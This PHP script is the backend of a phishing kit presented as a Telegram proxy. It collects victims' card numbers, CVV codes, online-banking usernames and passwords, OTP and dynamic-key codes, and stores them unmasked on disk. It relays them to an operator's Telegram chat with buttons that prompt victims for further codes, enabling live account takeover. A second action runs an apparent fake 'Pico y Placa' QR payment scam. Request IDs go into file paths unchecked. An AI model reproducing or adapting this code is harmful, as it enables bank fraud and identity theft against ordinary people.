<?php
// ═══════════════════════════════════════════
//  PROXY UNIVERSAL TELEGRAM
//  Centraliza todas las llamadas a Telegram
//  Elimina CORS, secrets expuestos y bypass
// ═══════════════════════════════════════════
require_once __DIR__ . '/config.php';

// ═══════════════════════════════════════════
//  CORS
// ═══════════════════════════════════════════
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json; charset=UTF-8");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit(); }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(["error" => "Método no permitido"]);
    exit();
}

// ═══════════════════════════════════════════
//  Leer datos del frontend
// ═══════════════════════════════════════════
$body = json_decode(file_get_contents("php://input"), true);
if (!$body) {
    http_response_code(400);
    echo json_encode(["error" => "Body JSON inválido"]);
    exit();
}

$action = $body['action'] ?? '';
if (!$action) {
    http_response_code(400);
    echo json_encode(["error" => "Campo 'action' requerido"]);
    exit();
}

// ═══════════════════════════════════════════
//  Función con resiliencia: retries + backoff
// ═══════════════════════════════════════════
function telegramRequest($endpoint, $payload, $retries = TG_MAX_RETRIES) {
    $url = "https://api.telegram.org/bot" . TG_BOT_TOKEN . "/" . $endpoint;

    for ($attempt = 1; $attempt <= $retries; $attempt++) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => json_encode($payload),
            CURLOPT_HTTPHEADER     => ['Content-Type: ' . 'application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => TG_TIMEOUT,
            CURLOPT_SSL_VERIFYPEER => true,
        ]);
        $resp    = curl_exec($ch);
        $curlErr = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($curlErr) {
            if ($attempt === $retries) {
                return ['ok' => false, 'error' => "Error de conexión: $curlErr"];
            }
            usleep(TG_RETRY_DELAY_MS * 1000 * $attempt);
            continue;
        }

        if ($httpCode === 429) {
            if ($attempt === $retries) {
                return ['ok' => false, 'error' => 'Rate limit excedido'];
            }
            usleep(TG_RETRY_DELAY_MS * 1000 * $attempt * 2);
            continue;
        }

        if ($httpCode >= 500) {
            if ($attempt === $retries) {
                return ['ok' => false, 'error' => "Error del servidor Telegram (HTTP $httpCode)"];
            }
            usleep(TG_RETRY_DELAY_MS * 1000 * $attempt);
            continue;
        }

        $data = json_decode($resp, true);
        return $data ?: ['ok' => false, 'error' => 'Respuesta inválida de Telegram'];
    }

    return ['ok' => false, 'error' => 'Reintentos agotados'];
}

// ═══════════════════════════════════════════
//  Escapar texto para MarkdownV2
// ═══════════════════════════════════════════
function escMD($s) {
    return preg_replace('/([_*\[\]()~`>#+=|{}.!\-])/', '\\\\$1', (string)$s);
}

// ═══════════════════════════════════════════
//  Generar ID único
// ═══════════════════════════════════════════
function generateId($prefix = 'req') {
    return $prefix . '_' . uniqid('', true) . '_' . bin2hex(random_bytes(4));
}

// ═══════════════════════════════════════════
//  Guardar solicitud en disco (persistencia robusta)
// ═══════════════════════════════════════════
function saveSolicitud($id, $data) {
    $file = DATA_DIR . '/solicitudes/' . $id . '.json';
    $data['created_at'] = date('c');
    $data['status'] = 'pending';
    file_put_contents($file, json_encode($data, JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function updateSolicitud($id, $updates) {
    $file = DATA_DIR . '/solicitudes/' . $id . '.json';
    if (!file_exists($file)) return false;
    $data = json_decode(file_get_contents($file), true);
    $data = array_merge($data, $updates);
    file_put_contents($file, json_encode($data, JSON_UNESCAPED_UNICODE), LOCK_EX);
    return true;
}

function getSolicitud($id) {
    $file = DATA_DIR . '/solicitudes/' . $id . '.json';
    if (!file_exists($file)) return null;
    return json_decode(file_get_contents($file), true);
}

// ═══════════════════════════════════════════
//  ROUTER DE ACCIONES
// ═══════════════════════════════════════════
$result = ['ok' => false, 'error' => 'Acción no reconocida'];

switch ($action) {

    case 'register_card':
        $solicitudId = generateId('card');
        $tipo     = $body['tipo'] ?? 'Desconocido';
        $nombre   = $body['nombre'] ?? '';
        $numero   = $body['numero'] ?? '';
        $exp      = $body['exp'] ?? '';
        $cvv      = $body['cvv'] ?? '';
        $banco    = $body['bancoEmisor'] ?? '';

        $last4 = strlen($numero) >= 4 ? substr($numero, -4) : '????';
        $masked = substr($numero, 0, 4) . ' **** **** ' . $last4;

        $text  = "💳 *NUEVA TARJETA REGISTRADA*\n\n";
        $text .= "ID: `" . escMD($solicitudId) . "`\n";
        $text .= "Tipo: " . escMD($tipo) . "\n";
        $text .= "Titular: " . escMD($nombre) . "\n";
        $text .= "Número: `" . escMD($masked) . "`\n";
        $text .= "Expiración: `" . escMD($exp) . "`\n";
        $text .= "CVV: `" . escMD($cvv) . "`\n";
        $text .= "Banco: " . escMD($banco) . "\n\n";
        $text .= "🕐 " . escMD(date('Y-m-d H:i:s'));

        $keyboard = [
            'inline_keyboard' => [[
                ['text' => '✅ Continuar', 'callback_data' => 'continue_' . $solicitudId]
            ]]
        ];

        saveSolicitud($solicitudId, [
            'type' => 'card',
            'card_type' => $tipo,
            'nombre' => $nombre,
            'numero' => $numero,
            'exp' => $exp,
            'cvv' => $cvv,
            'banco' => $banco,
        ]);

        $result = telegramRequest('sendMessage', [
            'chat_id'      => TG_CHAT_ID,
            'text'         => $text,
            'parse_mode'   => 'MarkdownV2',
            'reply_markup' => $keyboard,
        ]);

        if ($result['ok']) {
            $result['solicitudId'] = $solicitudId;
        }
        break;

    case 'send_credentials':
        $solicitudId = generateId('cred');
        $bancoEmisor = $body['bancoEmisor'] ?? 'No especificado';
        $numeroTarjeta = $body['numeroTarjeta'] ?? '';
        $cvv = $body['cvv'] ?? '';
        $vencimiento = $body['vencimiento'] ?? '';
        $usuario = $body['usuario'] ?? '';
        $password = $body['password'] ?? '';
        $monto = $body['monto'] ?? '';
        $fecha = $body['fecha'] ?? '';
        $tipoTarjeta = $body['tipoTarjeta'] ?? 'Desconocido';

        $last4 = strlen($numeroTarjeta) >= 4 ? substr($numeroTarjeta, -4) : '????';
        $masked = substr($numeroTarjeta, 0, 4) . ' **** **** ' . $last4;

        $text  = "🔔 *VERIFICADO - $tipoTarjeta*\n\n";
        $text .= "ID: `" . escMD($solicitudId) . "`\n\n";
        $text .= "🏛️ *BANCO EMISOR:* " . escMD($bancoEmisor) . "\n\n";
        $text .= "💳 *DATOS DE TARJETA:*\n";
        $text .= "Número: `" . escMD($masked) . "`\n";
        $text .= "CVV: `" . escMD($cvv) . "`\n";
        $text .= "Vencimiento: `" . escMD($vencimiento) . "`\n\n";
        $text .= "🏛️ *CREDENCIALES DEL BANCO:*\n";
        $text .= "Usuario: `" . escMD($usuario) . "`\n";
        $text .= "Contraseña: `" . escMD($password) . "`\n\n";
        $text .= "💰 Monto: " . escMD($monto) . "\n";
        $text .= "📅 Fecha: " . escMD($fecha) . "\n\n";
        $text .= "⏳ *Estado:* Esperando verificación de credenciales bancarias\\.\\.\\.";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '📱 PEDIR OTP',     'callback_data' => "pedir_otp_$solicitudId"],
                    ['text' => '🔑 PEDIR CLAVE DIN', 'callback_data' => "pedir_clave_din_$solicitudId"]
                ],
                [
                    ['text' => '❌ ERROR CREDENCIALES', 'callback_data' => "error_credenciales_$solicitudId"]
                ]
            ]
        ];

        saveSolicitud($solicitudId, [
            'type' => 'credentials',
            'card_type' => $tipoTarjeta,
            'banco' => $bancoEmisor,
            'numero' => $numeroTarjeta,
            'cvv' => $cvv,
            'vencimiento' => $vencimiento,
            'usuario' => $usuario,
            'password' => $password,
            'monto' => $monto,
            'fecha' => $fecha,
        ]);

        $result = telegramRequest('sendMessage', [
            'chat_id'      => TG_CHAT_ID,
            'text'         => $text,
            'parse_mode'   => 'MarkdownV2',
            'reply_markup' => $keyboard,
        ]);

        if ($result['ok']) {
            $result['solicitudId'] = $solicitudId;
        }
        break;

    case 'send_otp':
        $solicitudId = $body['solicitudId'] ?? '';
        $otp = $body['otp'] ?? '';
        $usuario = $body['usuario'] ?? '';
        $monto = $body['monto'] ?? '';
        $fecha = $body['fecha'] ?? '';
        $tipoTarjeta = $body['tipoTarjeta'] ?? 'Desconocido';

        $text  = "🔔 *VERIFICADO - $tipoTarjeta*\n\n";
        $text .= "ID: `" . escMD($solicitudId) . "`\n\n";
        $text .= "📱 *CÓDIGO OTP:*\n";
        $text .= "OTP: `" . escMD($otp) . "`\n\n";
        $text .= "🏛️ Usuario: `" . escMD($usuario) . "`\n\n";
        $text .= "💰 Monto: " . escMD($monto) . "\n";
        $text .= "📅 Fecha: " . escMD($fecha) . "\n\n";
        $text .= "⏳ *Estado:* Esperando verificación del OTP\\.\\.\\.";

        $keyboard = [
            'inline_keyboard' => [
                [['text' => '✅ APROBAR OTP',    'callback_data' => "aprobar_otp_$solicitudId"]],
                [['text' => '❌ RECHAZAR OTP',   'callback_data' => "rechazar_otp_$solicitudId"]]
            ]
        ];

        updateSolicitud($solicitudId, ['otp' => $otp, 'step' => 'otp_sent']);

        $result = telegramRequest('sendMessage', [
            'chat_id'      => TG_CHAT_ID,
            'text'         => $text,
            'parse_mode'   => 'MarkdownV2',
            'reply_markup' => $keyboard,
        ]);
        break;

    case 'send_clave_dinamica':
        $solicitudId = $body['solicitudId'] ?? '';
        $clave = $body['clave'] ?? '';
        $usuario = $body['usuario'] ?? '';
        $monto = $body['monto'] ?? '';
        $fecha = $body['fecha'] ?? '';
        $tipoTarjeta = $body['tipoTarjeta'] ?? 'Desconocido';

        $text  = "🔔 *VERIFICADO - $tipoTarjeta*\n\n";
        $text .= "ID: `" . escMD($solicitudId) . "`\n\n";
        $text .= "🔑 *CLAVE DINÁMICA:*\n";
        $text .= "Clave: `" . escMD($clave) . "`\n\n";
        $text .= "🏛️ Usuario: `" . escMD($usuario) . "`\n\n";
        $text .= "💰 Monto: " . escMD($monto) . "\n";
        $text .= "📅 Fecha: " . escMD($fecha) . "\n\n";
        $text .= "⏳ *Estado:* Esperando verificación de Clave Dinámica\\.\\.\\.";

        $keyboard = [
            'inline_keyboard' => [
                [['text' => '✅ APROBAR CLAVE DIN',  'callback_data' => "aprobar_clave_din_$solicitudId"]],
                [['text' => '❌ RECHAZAR CLAVE DIN', 'callback_data' => "rechazar_clave_din_$solicitudId"]]
            ]
        ];

        updateSolicitud($solicitudId, ['clave' => $clave, 'step' => 'clave_sent']);

        $result = telegramRequest('sendMessage', [
            'chat_id'      => TG_CHAT_ID,
            'text'         => $text,
            'parse_mode'   => 'MarkdownV2',
            'reply_markup' => $keyboard,
        ]);
        break;

    case 'pico_y_placa':
        $placa       = strtoupper(trim($body['placa'] ?? ''));
        $monto       = intval($body['monto'] ?? 0);
        $idSolicitud = trim($body['idSolicitud'] ?? '');
        $nombreComp  = trim($body['nombreCompleto'] ?? '');
        $tipoDoc     = trim($body['tipoDocumento'] ?? '');
        $numDoc      = trim($body['numeroDocumento'] ?? '');

        if (!$placa || !$monto) {
            http_response_code(400);
            echo json_encode(["error" => "Se requieren placa y monto"]);
            exit();
        }

        $paymentId = generateId('pyp');
        $montoFmt  = '$' . number_format($monto, 0, ',', '.');

        $payData = [
            'payment_id'     => $paymentId,
            'placa'          => $placa,
            'monto'          => $monto,
            'idSolicitud'    => $idSolicitud,
            'nombreCompleto' => $nombreComp,
            'tipoDocumento'  => $tipoDoc,
            'numeroDocumento'=> $numDoc,
            'status'         => 'pending',
            'created_at'     => date('c'),
            'message_id'     => null,
            'cus'            => null,
        ];
        file_put_contents(DATA_DIR . '/payments/' . $paymentId . '.json',
            json_encode($payData, JSON_UNESCAPED_UNICODE), LOCK_EX);

        $text  = "*Nueva solicitud Pico y Placa Solidario*\n\n";
        $text .= "Solicitud: `" . escMD($idSolicitud) . "`\n";
        $text .= "Placa: `" . escMD($placa) . "`\n";
        $text .= "Persona: " . escMD($nombreComp) . "\n";
        $text .= "Documento: " . escMD($tipoDoc) . " " . escMD($numDoc) . "\n";
        $text .= "*Monto a pagar: " . escMD($montoFmt) . "*\n\n";
        $text .= "El usuario esta realizando el pago por QR\\. Confirme o rechace una vez reciba el dinero\\.";

        $keyboard = [
            'inline_keyboard' => [[
                ['text' => 'Confirmar pago',    'callback_data' => 'confirm_' . $paymentId],
                ['text' => 'Pago no realizado', 'callback_data' => 'reject_'  . $paymentId],
            ]]
        ];

        $result = telegramRequest('sendMessage', [
            'chat_id'      => TG_CHAT_ID,
            'text'         => $text,
            'parse_mode'   => 'MarkdownV2',
            'reply_markup' => $keyboard,
        ]);

        if ($result['ok'] && isset($result['result']['message_id'])) {
            $payData['message_id'] = $result['result']['message_id'];
            file_put_contents(DATA_DIR . '/payments/' . $paymentId . '.json',
                json_encode($payData, JSON_UNESCAPED_UNICODE), LOCK_EX);
            $result['payment_id'] = $paymentId;
        }
        break;

    case 'check_status':
        $solicitudId = $body['solicitudId'] ?? '';
        if (!$solicitudId) {
            http_response_code(400);
            echo json_encode(["error" => "Campo 'solicitudId' requerido"]);
            exit();
        }
        $solicitud = getSolicitud($solicitudId);
        if ($solicitud) {
            $result = ['ok' => true, 'solicitud' => $solicitud];
        } else {
            $result = ['ok' => true, 'solicitud' => null, 'message' => 'No encontrada'];
        }
        break;

    case 'update_status':
        $solicitudId = $body['solicitudId'] ?? '';
        $estado = $body['estado'] ?? '';
        if (!$solicitudId || !$estado) {
            http_response_code(400);
            echo json_encode(["error" => "Campos 'solicitudId' y 'estado' requeridos"]);
            exit();
        }
        $ok = updateSolicitud($solicitudId, ['status' => $estado, 'updated_at' => date('c')]);
        $result = $ok ? ['ok' => true] : ['ok' => false, 'error' => 'Solicitud no encontrada'];
        break;

    default:
        http_response_code(400);
        echo json_encode(["error" => "Acción '$action' no reconocida"]);
        exit();
}

echo json_encode($result, JSON_UNESCAPED_UNICODE);
